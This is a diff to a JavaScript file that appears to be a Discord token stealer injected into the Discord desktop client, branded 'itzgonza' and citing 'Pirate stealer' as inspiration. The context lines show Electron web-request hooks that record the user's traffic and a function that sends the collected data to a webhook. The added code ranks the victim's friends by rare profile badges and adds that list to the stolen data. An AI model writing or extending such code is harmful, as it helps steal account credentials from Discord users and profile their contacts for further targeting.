@@ -7,6 +7,9 @@ const https = require('https');
 const querystring = require("querystring");
 const fs = require("fs");
 
+
+// Initialization
+
 var config = {
     brand: "itzgonza",
 
@@ -145,6 +148,8 @@ class Event {
     }
 }
 
+// Traffic recording (Pirate stealer inspiration)
+
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     try {
         if (details.url.startsWith(config.webhook)) {
@@ -241,6 +246,8 @@ session.defaultSession.webRequest.onCompleted(config.filters["user"], async (det
 
     } catch {}
 })
+
+// ==================================================================================
 
 var event_handlers = {
 
@@ -542,10 +549,13 @@ var event_handlers = {
     },
 }
 
+// ==================================================================================
 
 function getDiscordClient() {
     return `${process.cwd().replace(`${process.env.LOCALAPPDATA}\\`, '').split('\\')[0].split(7)}`
 }
+
+// ==================================================================================
 
 function getNitro(flags) {
     switch (flags) {
@@ -559,6 +569,15 @@ function getNitro(flags) {
             return "\`\`\`No Nitro\`\`\`";
 
     };
+}
+
+function getRareBadges(flags) {
+    var b = '';
+    for (const prop in config.badges) {
+        let o = config.badges[prop];
+        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
+    };
+    return b;
 }
 
 function getBadges(flags) {
@@ -610,10 +629,22 @@ async function getRelationships(token) {
     const r = json.filter((user) => {
         return user.type == 1
     })
+    var rareBadgesFriends = "";
+    for (z of r) {
+        var b = getRareBadges(z.user.public_flags)
+        if (b != "") {
+            rareBadgesFriends += b + ` | ${z.user.username}#${z.user.discriminator}\n`
+        }
+    }
+    if (!rareBadgesFriends) rareBadgesFriends = "No Rare Friends"
+
     return {
-        length: r.length
+        length: r.length,
+        frien: rareBadgesFriends
     }
 }
+
+// ==================================================================================
 
 function sendToWebhook(params) {
 
@@ -645,6 +676,8 @@ function sendToWebhook(params) {
     req.end();
 }
 
+// ==================================================================================
+
 function createEmbed(data) {
     let obj = {
         "footer": config.embed.footer,
@@ -657,6 +690,8 @@ function createEmbed(data) {
 
     return obj;
 }
+
+// ==================================================================================
 
 async function initialize() {
 
